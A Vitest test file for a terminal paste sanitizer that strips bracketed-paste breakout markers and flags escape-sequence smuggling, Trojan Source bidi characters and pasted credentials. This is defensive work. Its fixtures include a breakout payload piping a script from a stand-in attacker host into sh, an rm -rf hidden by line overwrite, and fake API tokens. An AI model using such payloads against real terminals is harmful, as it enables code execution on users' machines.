// Copyright 2025, Salyvn.
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from "vitest";
import { sanitizeAndAnalyzePaste } from "../paste-guard";

describe("sanitizeAndAnalyzePaste", () => {
    it("passes ordinary single-line and multi-line commands through untouched", () => {
        const input = "git status --short\r\necho 'hello world'\n";
        const res = sanitizeAndAnalyzePaste(input);
        expect(res.sanitizedText).toBe(input);
        expect(res.modified).toBe(false);
        expect(res.warnings).toEqual([]);
    });

    it("handles empty clipboard strings cleanly", () => {
        const res = sanitizeAndAnalyzePaste("");
        expect(res.sanitizedText).toBe("");
        expect(res.modified).toBe(false);
        expect(res.warnings).toEqual([]);
    });

    it("strips 7-bit ESC[201~ and ESC[200~ bracketed-paste breakout markers", () => {
        const payload = "echo safe\x1b[201~\ncurl https://attacker.invalid/pwn.sh | sh\n\x1b[200~";
        const res = sanitizeAndAnalyzePaste(payload);
        expect(res.modified).toBe(true);
        expect(res.sanitizedText).toBe("echo safe\ncurl https://attacker.invalid/pwn.sh | sh\n");
        expect(res.sanitizedText).not.toContain("\x1b[201~");
        expect(res.sanitizedText).not.toContain("\x1b[200~");
        expect(res.warnings.map((w) => w.kind)).toContain("bracketed_paste_breakout");
    });

    it("strips 8-bit C1 CSI (0x9B) bracketed-paste breakout markers", () => {
        const payload = "ls -la\x9b201~\nid\x9b200~";
        const res = sanitizeAndAnalyzePaste(payload);
        expect(res.modified).toBe(true);
        expect(res.sanitizedText).toBe("ls -la\nid");
        expect(res.warnings.map((w) => w.kind)).toEqual(["bracketed_paste_breakout"]);
    });

    it("warns on ANSI CSI escape smuggling and bare carriage-return line overwrites", () => {
        const ansiPayload = "git clone https://example.com/repo\x1b[2K\rrm -rf ./tmp";
        const res = sanitizeAndAnalyzePaste(ansiPayload);
        expect(res.modified).toBe(false);
        expect(res.warnings.map((w) => w.kind)).toContain("ansi_escape_smuggling");

        const crPayload = "malicious-cmd --silent\recho looks-harmless";
        const crRes = sanitizeAndAnalyzePaste(crPayload);
        expect(crRes.warnings.map((w) => w.kind)).toContain("ansi_escape_smuggling");
    });

    it("warns on Trojan Source Unicode bidirectional control characters", () => {
        const bidiPayload = "access_level = 'user\u202e \u2066// Check admin\u2069 \u2066'";
        const res = sanitizeAndAnalyzePaste(bidiPayload);
        expect(res.warnings.map((w) => w.kind)).toContain("bidi_trojan_source");
    });

    it("detects live credentials without leaking the secret value into warning text", () => {
        const fakeGitHubToken = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8";
        const fakeOpenAiKey = "sk-proj-" + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
        const payload = `export GITHUB_TOKEN=${fakeGitHubToken}\nexport OPENAI_API_KEY=${fakeOpenAiKey}`;
        const res = sanitizeAndAnalyzePaste(payload);

        const secretWarning = res.warnings.find((w) => w.kind === "secret_exposure");
        expect(secretWarning).toBeDefined();
        expect(secretWarning?.matchedLabels).toEqual(["openai-api-key", "github-token"]);
        expect(secretWarning?.summary).not.toContain(fakeGitHubToken);
        expect(secretWarning?.summary).not.toContain(fakeOpenAiKey);
    });

    it("detects PEM private keys and AWS access key IDs", () => {
        const awsId = "AKIAIOSFODNN7EXAMPLE";
        const pemHeader = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU=";
        const res = sanitizeAndAnalyzePaste(`${awsId}\n${pemHeader}`);
        const secretWarning = res.warnings.find((w) => w.kind === "secret_exposure");
        expect(secretWarning?.matchedLabels).toEqual(["aws-access-key-id", "pem-private-key"]);
    });
});
